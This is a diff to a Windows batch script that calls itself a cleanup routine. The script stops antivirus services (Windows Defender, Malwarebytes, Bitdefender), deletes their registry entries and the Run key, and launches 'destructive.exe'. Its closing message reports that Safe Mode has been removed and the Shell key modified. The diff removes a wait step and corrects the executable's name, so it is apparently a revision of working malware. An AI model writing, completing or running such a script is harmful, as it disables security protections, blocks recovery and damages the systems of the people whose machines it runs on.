@@ -242,9 +242,6 @@ sc stop "MBAMService"
 sc stop "WinDefend"
 sc stop "VSSERV"
 
-:: Wait a few seconds to ensure services are stopped
-timeout /t 2 /nobreak
-
 :: Perform cleanup tasks
 echo Deleting registry keys...
 reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /f
@@ -260,7 +257,7 @@ reg delete "HKLM\SYSTEM\ControlSet001\Services\MBAMService" /f
 reg delete "HKLM\SYSTEM\CurrentControlSet\Services\VSSERV" /f
 reg delete "HKLM\SYSTEM\ControlSet001\Services\VSSERV" /f
 
-"C:\Program Files\utkudrk2\desturctive.exe"
+"C:\Program Files\utkudrk2\destructive.exe"
 
 :: Confirm completion
 echo Cleanup tasks completed. Safe Mode should now be removed, destructive.exe is scheduled to run, and Shell key is modified.
